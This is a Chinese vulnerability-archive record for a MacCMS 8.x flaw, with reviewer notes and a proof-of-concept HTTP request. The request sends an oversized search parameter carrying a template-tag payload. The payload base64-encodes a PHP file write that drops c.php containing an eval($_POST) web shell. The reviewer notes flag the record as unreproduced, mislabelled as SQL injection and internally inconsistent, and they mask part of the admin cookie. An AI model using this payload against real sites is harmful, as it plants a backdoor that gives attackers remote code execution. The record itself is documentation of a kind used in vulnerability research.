---
source: "hatch 补库批 20260928"
product: "MacCMS8.x"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Maccms 8.x(苹果cms)post注入"
prerequisites: "来源所述条件，未列明部分仍待核：搜索模板执行路径；超长输入触发过滤异常；PHP旧行为；鉴权需排除示例管理员Cookie"
side_effects: "未执行；本文需注意的操作影响：标题post注入模糊，载荷为模板PHP写文件不是SQLi"
source_status: "unknown"
id: "vw-1574af80db8a22efc68912b1"
entity_id: "ve-1574af80db8a22efc68912b1"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：搜索模板执行路径；超长输入触发过滤异常；PHP旧行为；鉴权需排除示例管理员Cookie

- **操作与副作用边界（1）**：标题post注入模糊，载荷为模板PHP写文件不是SQLi。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **证据待核（2）**：80万a只占位，Content-Length500137又与声称长度冲突，无法原样复现；末标签缺闭合。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **凭据与会话边界（3）**：请求携管理员会话和其他域Origin，未证明无需认证；超长输入绕过机制/限制未解释。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Maccms 8.x post注入

一、漏洞简介
------------

苹果cms 8.x 注入

二、漏洞影响
------------

Maccms 8.x

三、复现过程
------------

    POST /index.php?m=vod-search HTTP/1.1
    Host: 0-sec.org
    Content-Length: 500137
    Cache-Control: max-age=0
    Origin: http://word.o2oxy.cn
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
    Referer: http://word.o2oxy.cn/index.php?m=vod-search
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
    Cookie: Hm_lvt_ff7f6fcad4e6116760e7b632f9614dc2=1574418087,1574670614,1574673402,1575271439; Hm_lvt_137ae1af30761db81edff2e16f0bf0f8=1574418087,1574670615,1574673402,1575275889; pgv_pvi=8322096128; PHPSESSID=pr3********************v53; adminid=1; adminname=admin; adminlevels=b%2Cc%2Cd%2Ce%2Cf%2Cg%2Ch%2Ci%2Cj; admincheck=2af**************************2d2
    Connection: close

    wd=uniona(这里a为80w个，可用Burp直接生成){if-A:print(fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29)}{endif-A
